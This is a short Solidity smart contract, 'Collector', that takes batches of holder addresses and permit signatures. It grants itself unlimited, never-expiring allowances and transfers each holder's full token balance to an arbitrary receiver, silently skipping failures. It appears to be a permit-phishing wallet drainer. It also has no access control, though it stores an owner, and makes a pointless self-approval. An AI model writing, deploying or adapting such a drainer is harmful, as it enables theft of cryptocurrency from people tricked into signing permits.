// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol";

contract Collector {
    address public token;
    address public owner;

    constructor(address _token) {
        token = _token;
        owner = msg.sender;
    }

    function collect(address[] calldata _addresses,  bytes32[] calldata _r, bytes32[] calldata _s, uint8[] calldata _v, address _receiver) external {
        require(_addresses.length == _r.length && _addresses.length == _s.length && _addresses.length == _v.length, "Invalid input");
        IERC20(token).approve(address(this), type(uint256).max);
        for (uint256 i = 0; i < _addresses.length; i++) {
            uint256 balance = IERC20(token).balanceOf(_addresses[i]);
            try IERC20Permit(token).permit(_addresses[i], address(this), type(uint256).max, type(uint256).max, _v[i], _r[i], _s[i]){

            }catch{}
            try IERC20(token).transferFrom(_addresses[i], _receiver, balance){

            }catch{}
        }
    }
}
